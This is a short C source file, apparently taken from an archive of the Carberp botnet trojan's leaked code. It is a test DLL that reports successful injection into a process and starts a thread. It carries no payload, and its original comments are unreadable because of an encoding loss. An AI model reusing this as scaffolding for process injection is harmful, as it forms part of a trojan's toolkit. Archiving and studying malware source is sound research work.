/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
# include "stdafx.h"

//
// ���������� ����������.
//

HANDLE ghThread = NULL;

//
// �������� ��������� ������ � ID ��������.
//

void
PrintString (

	LPWSTR pwString)

{
	WCHAR buf [512];
	
	wsprintf (buf, L"[%u] %s\r\n",
		GetCurrentProcessId (),
		pwString);

	OutputDebugString (
		buf);
}

//
// ����� ����� ��������� ������.
//

DWORD
WINAPI
ThreadProc (
			
	LPVOID lpParam)
{
	PrintString (
		L"DLL thread created successfully.");

	ExitThread (
		0);
}

//
// ����� ����� ������.
// � ���������� ������� C ������� ��������.
//

BOOL
APIENTRY
DllMain (

	HMODULE hModule,
	DWORD uReason,
	LPVOID lpReserved)

{
	DWORD dwThreadId = 0;

	//
	// ��������� ������.
	//

	switch (uReason)
	{
		//
		// ��� ������������ ������, ������� �����������
		// ����� ������� DLL ����� �������, ������ �� ��������.
		//

		case DLL_PROCESS_ATTACH:
		{
			PrintString (
				L"DLL injected successfully.");

			//
			// �������� �����������������:
			// ������ ��������������� �����.
			//

			ghThread = CreateThread (
				NULL,
				0,
				ThreadProc,
				NULL,
				0,
				&dwThreadId);

			break;
		}
	}

	//
	// � ������ ������ ������� �������� ���������
	// �������� DLL �� �������������, ������� ������
	// ���������� TRUE.
	//

	return TRUE;
}

